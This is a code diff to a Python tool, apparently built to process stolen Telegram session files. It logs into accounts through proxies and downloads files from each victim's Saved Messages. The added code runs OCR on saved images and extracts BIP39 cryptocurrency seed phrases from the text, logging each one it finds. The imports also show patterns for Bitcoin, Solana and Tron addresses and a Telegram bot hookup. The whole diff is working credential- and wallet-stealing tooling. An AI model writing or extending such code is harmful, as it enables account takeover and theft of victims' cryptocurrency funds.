@@ -18,6 +18,7 @@ from utils.tg_funcs import send_message_to_telegram
 from utils.files_utils import write_to_file, parse_proxy
 from utils.basic import get_bip39_words, get_usernames, get_proxies
 from utils.patterns import HASH_PATTERN, BITCOIN_PATTERN, SOLANA_PATTERN, TRON_PATTERN
+from image_reader import extract_text
 
 from config import (
     TELEGRAM_BOT_TOKEN,
@@ -31,6 +32,30 @@ from config import (
 current_time = datetime.now().strftime("%d.%m.%Y_%H.%M")
 OUTPUT_FILE = f"{LOGS_DIR}/output_{current_time}.txt"
 stats = Stats()
+
+
+def extract_mnemonic(text):
+    BIP39_WORDS = get_bip39_words()
+    valid_lengths = (12, 15, 18, 21, 24)
+    max_valid_length = max(valid_lengths)
+    cleaned_text = re.sub(r"[^\w\s]", " ", text)
+    tokens = cleaned_text.strip().split()
+
+    for start in range(len(tokens)):
+        seq = []
+        for token in tokens[start:]:
+            token_lower = token.lower()
+            if token_lower.isdigit():
+                continue
+            elif token_lower in BIP39_WORDS:
+                seq.append(token_lower)
+            else:
+                break
+            if len(seq) in valid_lengths:
+                return " ".join(seq)
+            if len(seq) > max_valid_length:
+                break
+    return None
 
 
 async def check_auth(session_path, api_id, api_hash, proxy):
@@ -58,6 +83,32 @@ async def download_txt_files_from_saved_messages(client, session_name):
                 await random_delay()
     except Exception as e:
         print(f"Ошибка при скачивании файлов из сохраненных сообщений: {e}")
+
+
+async def download_images_from_favorited_messages(client, session_name):
+    try:
+        favorites = await client.get_entity("me")
+        async for message in client.iter_messages(favorites):
+            if message.photo:
+                file_path = os.path.join(DOWNLOADS_DIR, f"{message.id}.jpg")
+                await client.download_media(message, file_path)
+                print(f"Скачано изображение: {file_path}")
+                await random_delay()
+
+                normal_path = file_path.replace("\\", "/")
+                text = extract_text(normal_path)
+                checked_text = extract_mnemonic(text)
+                if checked_text:
+                    print(f"Найдена сид фраза: {checked_text}")
+                    write_to_file(OUTPUT_FILE, f"Сессия: {session_name}")
+                    stats.seed_phrases.append(f"[SEED] {checked_text}")
+                    stats.total_seeds += 1
+                    stats.combined_findings += 1
+                    write_to_file(OUTPUT_FILE, f"Найдена сид фраза: {checked_text}")
+                    write_to_file(OUTPUT_FILE, "")
+
+    except Exception as e:
+        print(f"Ошибка при скачивании изображений из избранных: {e}")
 
 
 async def check_contacts(client, session_name):
@@ -252,6 +303,7 @@ async def process_session(session_path, session_name):
                         f"Сессия {session_name} успешно подключилась через {proxy[1]}:{proxy[2]}"
                     )
                     await download_txt_files_from_saved_messages(client, session_name)
+                    await download_images_from_favorited_messages(client, session_name)
                     await check_contacts(client, session_name)
 
                     async for dialog in client.iter_dialogs():
